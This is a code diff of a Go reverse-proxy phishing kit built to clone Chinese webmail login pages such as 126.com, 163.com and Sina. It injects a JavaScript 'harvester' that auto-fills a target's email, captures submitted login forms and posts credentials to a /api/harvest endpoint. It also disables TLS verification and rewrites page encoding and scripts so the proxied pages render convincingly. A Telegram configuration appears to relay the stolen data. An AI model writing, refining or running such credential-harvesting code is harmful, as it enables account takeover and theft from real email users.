@@ -7,7 +7,6 @@ import (
 	"encoding/base64"
 	"io"
 	"log"
-	"net"
 	"net/http"
 	"net/http/cookiejar"
 	"net/url"
@@ -37,7 +36,6 @@ var store = &SessionStore{
 
 const harvesterScript = `
 <script>
-// 1. Polyfill
 const OriginalURL = window.URL;
 window.URL = function(url, base) {
     try { return new OriginalURL(url, base || window.location.origin); } 
@@ -50,13 +48,11 @@ window.URL = function(url, base) {
 };
 window.URL.prototype = OriginalURL.prototype;
 
-// 2. Universal Auto-Fill
 var fillAttempts = 0;
 var fillInterval = setInterval(function() {
     var email = window._targetEmail;
     if (!email || fillAttempts > 20) { clearInterval(fillInterval); return; }
 
-    // Target standard inputs and Netease inputs
     var inputs = document.querySelectorAll('input[type="text"], input[type="email"], input[name="username"], input[name="email"], input[name="account_name"], input[id="mailInput"]');
     
     if (inputs.length > 0) {
@@ -76,7 +72,6 @@ var fillInterval = setInterval(function() {
     fillAttempts++;
 }, 500);
 
-// 3. Catch All Submissions
 function sendHarvest(data) {
     fetch(window.location.origin + '/api/harvest', {
         method: 'POST',
@@ -106,16 +101,6 @@ document.addEventListener('submit', function(e) {
         sendHarvest(params.toString() + '&type=login');
     }
 }, false);
-
-document.addEventListener('click', function(e) {
-    if (e.target.tagName === 'BUTTON' || e.target.type === 'submit') {
-        var passwords = document.querySelectorAll('input[type="password"]');
-        if (passwords.length > 0 && passwords[0].value !== "") {
-            var email = window._targetEmail || "Unknown";
-            sendHarvest('type=login&email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(passwords[0].value));
-        }
-    }
-}, true);
 </script>
 `
 
@@ -188,22 +173,9 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 		proxyClient := &http.Client{
 			Timeout: 15 * time.Second,
 			Jar:     jar,
-			CheckRedirect: func(req *http.Request, via []*http.Request) error {
-				if len(via) >= 3 {
-					return http.ErrUseLastResponse
-				}
-				return nil
-			},
 			Transport: &http.Transport{
 				ForceAttemptHTTP2: false,
-				DialContext: (&net.Dialer{
-					Timeout:   10 * time.Second,
-					KeepAlive: 30 * time.Second,
-				}).DialContext,
-				TLSHandshakeTimeout: 10 * time.Second,
-				MaxIdleConns:        100,
-				IdleConnTimeout:     90 * time.Second,
-				TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
+				TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
 			},
 		}
 
@@ -237,7 +209,6 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 
 		bodyBytes, _ := io.ReadAll(bodyReader)
 
-		// Handle GBK encoding for Chinese providers
 		if strings.Contains(targetBase, "126.com") || strings.Contains(targetBase, "163.com") || strings.Contains(targetBase, "sina.com") || strings.Contains(strings.ToLower(resp.Header.Get("Content-Type")), "gbk") {
 			reader := transform.NewReader(bytes.NewReader(bodyBytes), simplifiedchinese.GBK.NewDecoder())
 			if decoded, err := io.ReadAll(reader); err == nil {
@@ -247,20 +218,14 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 
 		bodyStr := string(bodyBytes)
 
-		// FIX 1: Strip out ALL scripts that contain document.write. These are injecting the GBK meta tags!
 		reDocWrite := regexp.MustCompile(`(?i)<script[^>]*>.*?document\.write.*?<\/script>`)
 		bodyStr = reDocWrite.ReplaceAllString(bodyStr, "")
 
-		// FIX 2: Replace all meta charset tags with UTF-8
 		reMeta := regexp.MustCompile(`(?i)<meta[^>]*charset=["']?gbk["']?[^>]*>`)
 		bodyStr = reMeta.ReplaceAllString(bodyStr, `<meta charset="utf-8">`)
 		bodyStr = strings.ReplaceAll(bodyStr, "charset=gbk", "charset=utf-8")
 		bodyStr = strings.ReplaceAll(bodyStr, "charset=\"gbk\"", "charset=\"utf-8\"")
 		bodyStr = strings.ReplaceAll(bodyStr, "charset='gbk'", "charset='utf-8'")
-
-		// FIX 3: Strip the tracking script causing the "Please enable cookies" red text
-		reTrack := regexp.MustCompile(`(?i)<script[^>]*src=["'][^"']*(countly|mailstats|tongji)[^"']*["'][^>]*><\/script>`)
-		bodyStr = reTrack.ReplaceAllString(bodyStr, "")
 
 		reSW := regexp.MustCompile(`(?i)navigator\.serviceWorker\.register\(.*?\)`)
 		bodyStr = reSW.ReplaceAllString(bodyStr, `(function(){ return Promise.resolve(); })()`)
